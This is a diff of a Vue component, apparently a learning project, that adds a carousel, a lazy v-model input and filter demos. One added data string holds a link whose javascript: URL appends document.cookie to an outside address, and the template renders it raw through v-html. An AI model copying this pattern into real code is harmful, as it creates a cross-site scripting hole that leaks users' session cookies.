@@ -1,9 +1,9 @@
 <template>
   <div class="search">
-    Search
     {{ a }}
     <button @click="toHome">to Home</button>
     <button @click="toSearch">to Search</button>
+    <br><br>
     <div class="swiper-container">
       <div class="swiper-wrapper">
         <div v-for="item in list" :key="item" class="swiper-slide">Slide {{ item }}</div>
@@ -14,10 +14,16 @@
       <!-- 如果需要导航按钮 -->
       <div class="swiper-button-prev"></div>
       <div class="swiper-button-next"></div>
-      
-      <!-- 如果需要滚动条 -->
-      <div class="swiper-scrollbar"></div>
-  </div>
+    </div>
+    <br>
+    <div>
+      <h5 style="display: inline-block">v-model.lazy--光标失去更新数据：</h5>
+      <input type="text" v-model.lazy="msg">
+    </div>
+    <h5>过滤器(默认参数)：{{ time | formatTime }}</h5>
+    <h5>过滤器(传参)：{{ time | formatTime('YYYY-MM-DD') }}</h5>
+    <h5>过滤器串联使用：{{ time | formatTime | sliceStr }}</h5>
+    <span v-html="span"></span>
   </div>
 </template>
 
@@ -26,20 +32,34 @@ import { getBaseCategoryList, getMockTestData } from '@/api'
 getBaseCategoryList()
 import Swiper from 'swiper'
 import 'swiper/css/swiper.css'
+
 export default {
   props: ['a'],
   data() {
     return {
-      list: []
+      list: [],
+      num: 1,
+      msg: '',
+      time: 1639124446679,
+      span: '<a href="javascript:location.href="http://www.baidu.com?"+document.cookie">百度</a>'
     }
   },
   computed: {
-
+  },
+  filters: {
+    sliceStr(str) {
+      return str.slice(0,4)
+    }
   },
   created() {
   },
   mounted() {
+    setTimeout(() => {
+      this.num++
+    },2000)
     this.getMockTestData()
+  },
+  updated() {
   },
   methods: {
     toHome() {
